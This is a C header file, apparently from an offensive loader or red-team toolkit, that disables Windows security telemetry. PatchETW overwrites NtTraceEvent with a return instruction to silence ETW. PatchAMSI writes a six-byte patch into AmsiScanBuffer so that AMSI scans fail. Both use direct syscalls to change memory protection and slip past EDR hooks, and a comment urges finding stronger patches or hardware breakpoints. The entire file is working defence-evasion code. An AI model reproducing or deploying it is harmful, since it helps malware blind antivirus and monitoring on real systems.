#pragma once
#include <windows.h>
#include "../auxiliary/syscalls.h"
#include "../auxiliary/helpers.h"

// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~++~+~+~+~+~+~+~+~+~+~+~+ //
// TODO FOR YOU: These patches are very basic. Maybe find another one? Or use HWBP? //
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~++~+~+~+~+~+~+~+~+~+~+~+ //

/**
 * Patches NtTraceEvent to disable ETW.
 */
BOOL 
PatchETW(
    HMODULE hNtdll
)
{
    SIZE_T patchSize = 1;
    DWORD dwOld      = 0;

    // Locate target function
    PVOID pNtTraceEvent = (PVOID)HlpGetProcAddress(hNtdll, "NtTraceEvent");
    if (!pNtTraceEvent)
    {
        return FALSE;
    }

    // Make writeable
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pNtTraceEvent, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
    if (!NT_SUCCESS(ntStatus))
    {
        return FALSE;
    }

    // Patch
    RtlCopyMemory(pNtTraceEvent, "\xc3", 1);

    // Re-Protect
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pNtTraceEvent, &patchSize, dwOld, &dwOld);
    if (!NT_SUCCESS(ntStatus))
    {
        return FALSE;
    }
    return TRUE;
}

/**
 * Patches AmsiScanBuffer to disable AMSI.
 */
BOOL 
PatchAMSI()
{
    SIZE_T patchSize = 6;
    DWORD dwOld      = 0;

    // Load amsi.dll
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if(!hAmsi)
    {
        printf("[!] Failed to load amsi.dll");
        return FALSE;
    }

    // Locate target function
    PVOID pAmsiScanBuffer = (PVOID)HlpGetProcAddress(hAmsi, "AmsiScanBuffer");
    if(!pAmsiScanBuffer)
    {
        return FALSE;
    }

    // Make writeable
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pAmsiScanBuffer, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
    if (!NT_SUCCESS(ntStatus))
    {
        return FALSE;
    }

    // Patch
    BYTE patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    RtlCopyMemory(pAmsiScanBuffer, &patch, 6);

    // Re-Protect
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pAmsiScanBuffer, &patchSize, dwOld, &dwOld);
    if (!NT_SUCCESS(ntStatus))
    {
        return FALSE;
    }

    return TRUE;
}
